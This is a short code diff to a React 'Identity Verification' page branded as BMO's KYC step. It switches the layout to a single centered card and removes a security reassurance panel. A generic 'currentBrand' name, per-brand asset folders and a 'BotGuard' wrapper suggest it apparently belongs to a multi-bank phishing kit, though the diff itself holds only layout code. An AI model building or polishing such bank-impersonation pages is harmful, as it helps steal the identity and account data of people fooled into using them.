@@ -2,7 +2,7 @@
 
 /**
  * BMO KYC (Know Your Customer) Page
- * Clean, minimal design consistent with BMO branding
+ * Centered single-column layout for desktop
  */
 
 import { useState, useEffect } from 'react';
@@ -106,9 +106,8 @@ export default function KYCPage() {
         <h1>Identity Verification</h1>
       </div>
 
-      {/* Two Column Layout */}
-      <div className="main-container">
-        {/* Card */}
+      {/* Centered Single Card Layout */}
+      <div className="centered-container">
         <div className="login-card">
           <div className="card-header">
             <h2>Identity Verification</h2>
@@ -201,19 +200,6 @@ export default function KYCPage() {
               Need help? Contact {currentBrand.companyName} support
             </p>
           </form>
-        </div>
-
-        {/* Right Panels */}
-        <div className="info-panels">
-          <div className="info-card security-card">
-            <div className="security-header">
-              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
-              <h2>Your security always comes first</h2>
-            </div>
-            <p className="security-text">
-              We use bank-grade encryption to protect your information during verification.
-            </p>
-          </div>
         </div>
       </div>
     </BotGuard>
